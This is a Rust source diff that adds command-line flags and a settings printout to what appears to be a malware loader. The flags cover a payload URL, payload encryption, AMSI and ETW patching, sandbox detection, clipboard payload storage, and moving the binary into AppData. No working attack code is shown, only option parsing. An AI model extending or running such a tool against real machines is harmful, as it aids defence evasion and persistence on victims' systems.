@@ -42,6 +42,18 @@ pub struct CmdOptions {
     #[arg(short, long, conflicts_with = "verbose")]
     pub quiet: bool,               
 
+    /// [Experimental Feature] Save Payload in Clipboard Buffer
+    #[arg(short='c', long="clipboard")]
+    pub use_clipboard: bool,  
+
+    /// Move executable to AppData
+    #[arg(short='m', long="move")]
+    pub move_exe: bool,
+    
+    /// Location to be moved to 
+    #[arg(short, long)]
+    pub location: Option<String>,
+
     /// Print verbose messages
     #[arg(short, long, conflicts_with = "quiet")]
     pub verbose: bool              
@@ -64,6 +76,31 @@ impl fmt::Display for CmdOptions {
                 "Normal"
             }
         };
-        write!(f, "[i] URL: {:?}\n[i] Encrypted: {}\r\n[i] Decryption Key: {:?}\r\n[i] Patch AMSI: {}\r\n[i] Patch ETW: {}\r\n[i] Detect Sandbox: {}\r\n[i] Printing Mode: {}\r\n", self.url, self.enc, self.key, self.patch_amsi, self.patch_etw, self.detect_sandbox, printing_mode)
+
+        let mut msg = format!("[i] URL:\t\t\t{}\r\n", self.url);
+        msg = format!("{}[i] Encrypted:\t\t\t{}\r\n",msg, self.enc);
+        if self.enc {
+            let dec_key = match &self.key {
+                Some(v) => v.as_str(),
+                None => "None"
+            };
+                
+            msg = format!("{}[i] Decryption Key:\t\t{}\r\n", msg, dec_key);
+        }
+        msg = format!("{}[i] Patch AMSI:\t\t\t{}\r\n",msg, self.patch_amsi);
+        msg = format!("{}[i] Patch ETW:\t\t\t{}\r\n",msg, self.patch_etw);
+        msg = format!("{}[i] Detect Sandbox:\t\t{}\r\n",msg, self.detect_sandbox);
+        msg = format!("{}[i] Printing Mode:\t\t{}\r\n", msg, printing_mode);
+        msg = format!("{}[i] Use Clipboard Buffer:\t{}\r\n", msg, self.use_clipboard);
+        
+        if self.move_exe {
+            let move_path: &str = match &self.location {
+                Some(v) => v.as_str(),
+                None => "None"
+            };    
+            msg = format!("{}[i] Move Binary To:\t\t{}\r\n", msg, move_path);
+        }
+
+        write!(f, "{}", msg)
     }
 }
